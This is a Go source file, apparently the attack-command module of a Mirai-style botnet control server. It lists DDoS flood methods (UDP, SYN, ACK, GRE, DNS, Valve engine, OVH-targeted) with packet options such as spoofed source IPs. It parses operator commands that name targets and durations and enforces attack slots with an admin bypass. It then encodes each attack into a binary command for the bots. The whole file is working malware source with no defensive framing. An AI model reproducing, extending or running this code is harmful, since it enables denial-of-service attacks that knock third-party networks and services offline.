package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
	_ "github.com/mattn/go-shellwords"
)

var (
	slots        = 1
	attackstatus = true
)

type AttackInfo struct {
	AttackID          uint8
	AttackFlags       []uint8
	AttackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 // Prefix/netmask
	Flags    map[uint8]string // key=value
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

type ApiInfo struct {
	ID   int
	APIs []string
	Name string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"size": {
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": {
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": {
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": {
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": {
		4,
		"TTL field in IP header, default is 255",
	},
	"df": {
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": {
		6,
		"Source port, default is random",
	},
	"port": {
		7,
		"Destination port, default is random",
	},
	"domain": {
		8,
		"Domain name to attack",
	},
	"dhid": {
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": {
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": {
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": {
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": {
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": {
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": {
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": {
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": {
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": {
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"method": {
		20,
		"HTTP method name, default is get",
	},
	"postdata": {
		21,
		"POST data, default is empty/none",
	},
	"path": {
		22,
		"HTTP path, default is /",
	},
	"conns": {
		24,
		"Number of connections",
	},
	"source": {
		25,
		"Source IP address, 255.255.255.255 for random",
	},
	"host": {
		26,
		"Domain/ip to flood",
	},
	"time": {
		27,
		"Time to flood the ip for",
	},
	"threads": {
		28,
		"Amount of threads to run on",
	},
	"length": {
		29,
		"Time of attack 1 = short 3 = long",
	},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"!udp": {
		0,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"UDP flood",
	},
	"!vse": {
		1,
		[]uint8{2, 3, 4, 5, 6, 7},
		"Valve source engine specific flood",
	},
	"!dns": {
		2,
		[]uint8{2, 3, 4, 5, 6, 7, 8, 9},
		"DNS resolver flood using the targets domain, input IP is ignored",
	},
	"!syn": {
		3,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"SYN flood",
	},
	"!ack": {
		4,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ACK flood",
	},
	"!stomp": {
		5,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"TCP stomp flood",
	},
	"!greip": {
		6,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"GRE IP flood",
	},
	"!greeth": {
		7,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"GRE Ethernet flood",
	},
	"!udpplain": {
		8,
		[]uint8{0, 1, 7},
		"UDP flood with less options. optimized for higher PPS",
	},
	"!std": {
		9,
		[]uint8{0, 6, 7},
		"STD flood",
	},
	"!xmas": {
		10,
		[]uint8{0, 6, 7},
		"STD flood",
	},
	"!tcp": {
		11,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"TCP Flood",
	},
	"!ovh": {
		12,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ovh ip time",
	},
	"!stdhex": {
		13,
		[]uint8{0, 1, 7},
		"STD-HEX Flood",
	},
	"!udprand": {
		14,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"UDP-RAND Flood",
	},
	"!storm": {
		15,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"ACK+PSH TCP Flood",
	},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin bool, bypass bool) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	if !bypass {
		if database.runningatk() > 1 {
			return nil, fmt.Errorf("%d/%d slots are in use", database.runningatk(), slots)
		}
		if admin {
			attackstatus = true
		}
		if attackstatus == false {
			return nil, fmt.Errorf("attacks are currently set to disabled")
		}
	}

	var atkInfo AttackInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	} else {
		var exists bool
		atkInfo, exists = attackInfoLookup[args[0]]
		if !exists {
			return nil, fmt.Errorf("\x1b[0mThe command '%s' \x1b[0mCould not be found\x1b[0m.", args[0])
		}
		atk.Type = atkInfo.AttackID
		args = args[1:]
	}
	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("Must specify prefix/netmask as targets")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("Blank target specified!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	if database.runningatk() > 1 {
		return nil, fmt.Errorf("%d/%d slots are in use", database.runningatk(), slots)
	}

	if attackstatus == false {
		return nil, fmt.Errorf("attacks are currently set to disabled")
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack duration")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 3600 {
			return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	if database.runningatk() > 1 {
		return nil, fmt.Errorf("%d/%d slots are in use", database.runningatk(), slots)
	}

	if attackstatus == false {
		return nil, fmt.Errorf("attacks are currently set to disabled")
	}

	// Parse flags
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
			for _, flagID := range atkInfo.AttackFlags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
			validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.AttackFlags) || (admin && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("Cannot have more than 255 flags")
	}

	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	// Add in attack duration
	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	// Add in attack type
	buf = append(buf, byte(this.Type))

	// Send number of targets
	buf = append(buf, byte(len(this.Targets)))

	// Send targets
	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	// Send number of flags
	buf = append(buf, byte(len(this.Flags)))

	// Send flags
	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	// Specify the total length
	if len(buf) > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}
